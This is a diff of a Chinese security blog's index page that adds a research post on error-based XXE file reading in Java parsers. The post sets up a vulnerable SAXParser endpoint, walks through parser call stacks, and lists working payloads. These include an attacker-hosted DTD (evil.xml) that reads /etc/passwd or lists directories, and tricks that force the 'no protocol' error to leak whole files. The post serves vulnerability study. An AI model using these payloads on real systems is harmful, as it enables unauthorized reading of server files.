@@ -130,17 +130,17 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">6</span></a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">9</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
 
   </li>
         <li class="menu-item menu-item-about">
@@ -197,6 +197,169 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttestoo.github.io/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avator.jpg">
+      <meta itemprop="name" content="ttestoo">
+      <meta itemprop="description" content="不争">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ttestoo's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">Java中XXE利用-通过URL报错读文件</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-16 23:11:24" itemprop="dateCreated datePublished" datetime="2022-01-16T23:11:24+08:00">2022-01-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-14 10:21:02" itemprop="dateModified" datetime="2022-02-14T10:21:02+08:00">2022-02-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XXE/" itemprop="url" rel="index"><span itemprop="name">XXE</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XXE/Java-Sec/" itemprop="url" rel="index"><span itemprop="name">Java Sec</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在记录了部分XXE利用之后，又看到了java环境下的另外一种利用方式：通过URL类未知协议的报错来将读取的文件进行回显；</p>
+<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>可编写一个controller，接收上传的xml文件并解析，service层解析逻辑这里省略了（以SAXParserFactory为例）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/SAXParserFactoryXXE&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;SAXParserFactory-XXE&quot;, notes = &quot;SAXParserFactory场景下的xxe&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">SAXParserFactoryXXE</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> <span class="keyword">throws</span> IOException, DocumentException, SAXException, ParserConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (file.getSize() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;请上传正确的文件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String originFileName = file.getOriginalFilename();</span><br><span class="line">    <span class="keyword">if</span> (!originFileName.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;请上传xml文件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] byteArr = file.getBytes();</span><br><span class="line">    InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(byteArr);</span><br><span class="line"></span><br><span class="line">    SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();</span><br><span class="line">    SAXParser saxParser = saxParserFactory.newSAXParser();</span><br><span class="line">    saxParser.parse(inputStream, <span class="keyword">new</span> DefaultHandler());</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;xml内容处理&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里debug时为方便，我直接通过读取本地的xml文件进行调试（以DocumentBuilderFactory为例）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">Document document = documentBuilder.parse(<span class="keyword">new</span> File(<span class="string">&quot;java-sec-study/java-sec-vuln/src/main/java/com/ttestoo/environment/test/parse.xml&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>1、准备一个xml文件（后缀为dtd也可，本质是一个dtd文件）并进行web托管，内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、payload如下（其中当目标不出网时，恶意xml地址也可通过其他内网可出网的web应用存在的漏洞进行触发，例如：jira、cf的ssrf等）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ext</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.24.75:83/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、成功通过报错回显读取的文件：</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642311110833-a2a22bfa-9b31-4002-8806-333f4c0a3f30.png" alt="img"></p>
+<p>也可进行列目录，更改托管的恶意xml文件中实体file的内容即可，例如列根目录：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642313633156-88adb897-8edc-45ab-8af1-46d6f176a1d7.png" alt="img"></p>
+<h1 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h1><p>这里以读取/etc/passwd内容为例，列目录等类似，只是file协议读取的结果不一样而已：</p>
+<p>1、发送payload，后端在解析xml时会先解析dtd，其中首先解析dtd实体ext，此时http请求<a target="_blank" rel="noopener" href="http://192.168.24.75:83/evil.xml">http://192.168.24.75:83/evil.xml</a> 获取到恶意的xml内容；</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312451180-dadbf495-9814-44e0-8ea1-e68b6b6aae83.png" alt="img"></p>
+<p>com.sun.org.apache.xerces.internal.impl.XMLEntityManager#setupCurrentEntity</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312545237-db73a499-1147-4793-9deb-03fed225547b-20220214102044596.png" alt="img"></p>
+<p>2、接着解析dtd实体ent，由于嵌套关系，会间接解析实体file并通过file协议读取到/etc/passwd内容，此时ent内容为：<!ENTITY data SYSTEM '/etc/passwd文件内容'></p>
+<p>com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl#scanEntityValue</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312687276-9b913363-c850-4c5b-a85e-4084b4edef6a.png" alt="img"></p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312748419-838cbe5f-16f5-437e-9a9f-f1ca0a85d157.png" alt="img"></p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312921183-7285f7d7-15f2-4239-bf67-a8dc6d04307f.png" alt="img"></p>
+<p>解析实体file读取/etc/passwd的完整过程如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setupCurrentEntity:<span class="number">698</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1304</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1240</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startPE:<span class="number">741</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanEntityValue:<span class="number">1729</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanEntityDecl:<span class="number">1590</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDecls:<span class="number">2028</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDTDInternalSubset:<span class="number">363</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">dispatch:<span class="number">1100</span>, XMLDocumentScannerImpl$DTDDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">1045</span>, XMLDocumentScannerImpl$DTDDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">933</span>, XMLDocumentScannerImpl$PrologDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">602</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">505</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">842</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">771</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">243</span>, DOMParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">339</span>, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">205</span>, DocumentBuilder (javax.xml.parsers)</span><br><span class="line">main:<span class="number">30</span>, XXETest (com.ttestoo.environment.test)</span><br></pre></td></tr></table></figure>
+
+<p>解析完实体file后，会循环将/etc/passwd的内容赋给ent实体：</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642313254849-f8fd8fa7-7d55-4b08-9293-03c007e44e8b.png" alt="img"></p>
+<p>3、在解析完dtd后，将会开始解析文档元素，则开始解析实体data，但是此时实体data对应的是/etc/passwd文件内容（##\n# User Database….，格式不满足 ‘协议名:’ 开头），此时在定义URL类时将报错no protocol，且会把读取的文件内容抛出，从而实现了通过no protocol报错内容回显读取的敏感文件的效果（非常优雅！）：</p>
+<p>java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312009421-49145af6-b0ef-4a9e-ba5a-1037850d7c2d.png" alt="img"></p>
+<p>完整调用栈如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">592</span>, URL (java.net)</span><br><span class="line">&lt;init&gt;:<span class="number">490</span>, URL (java.net)</span><br><span class="line">&lt;init&gt;:<span class="number">439</span>, URL (java.net)</span><br><span class="line">setupCurrentEntity:<span class="number">620</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1304</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1240</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanEntityReference:<span class="number">1908</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">3061</span>, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">602</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">505</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">842</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">771</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">243</span>, DOMParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">339</span>, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">205</span>, DocumentBuilder (javax.xml.parsers)</span><br><span class="line">main:<span class="number">30</span>, XXETest (com.ttestoo.environment.test)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="疑问探究"><a href="#疑问探究" class="headerlink" title="疑问探究"></a>疑问探究</h1><p>相关利用中，两种报错：</p>
+<ul>
+<li>当协议不存在即文件中不存在 ‘:’ 时才会报 ‘no protocal’，并将所有的文件内容回显；</li>
+<li>当协议存在但无效时，即文件中存在 ‘:’ ，但 ‘:’ 前面的内容不是一个有效的协议字符，会报 ‘unknown protocal’，此时仅会将文件内容中 ‘:’ 前面的数据回显；</li>
+</ul>
+<p>上面分析的过程中，/etc/passwd中存在很多的 ‘:’，为啥会报no protocol呢？应该会报错 ‘unknown protocal’ 才对啊？</p>
+<p>细心可发现，在java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)中判断 ‘:’ 之前进行了判断是否以 ‘#’ 开头，当以’#’开头时则直接无协议：</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642318259709-a96414dd-1bc3-40f5-bc4b-37c176d4fbb4.png" alt="img"></p>
+<h1 id="可利用的场景"><a href="#可利用的场景" class="headerlink" title="可利用的场景"></a>可利用的场景</h1><p>1、实测对于SAXParserFactory、JAXP DocumentBuilderFactory等场景，均可通过报错回显读取文件，其核心报错是在java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)中，理论上来说一般场景均可能通过此方式读取文件，当然前提是响应中要包含报错内容；</p>
+<p>2、通过ftp读文件会收到jdk版本的限制，但是这个利用方式我本地验证jdk8u66、jdk8u121、jdk8u191、jdk14均可成功利用，由于是URL类的报错，所以这种利用方式在可看到报错的场景下会很好用！</p>
+<p>注意：</p>
+<ul>
+<li>读取的文件不能为单行文件，否则会将文件内容进行拼接到http请求中，此时http请求无法正常请求会报错（是不是可以用于其他漏洞打组合拳？）：</li>
+</ul>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642316861965-10fe7158-9aed-47f6-a73e-792e11cb1bd4.png" alt="img"></p>
+<ul>
+<li>**’unknown protocol’ 报错时仅报错部分文件内容，可通过在实体data中手工添加一个 ‘:’ 来实现一定报错 ‘no protocol’**：</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>或者手工添加一个 ‘#’ 来达到同样的效果：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///tmp/test.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;#%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a>巨人的肩膀</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1440,20 +1603,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1512,13 +1675,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">44k</span>
+    <span title="站点总字数">51k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">40 分钟</span>
+    <span title="站点阅读时长">46 分钟</span>
 </div>
 
         
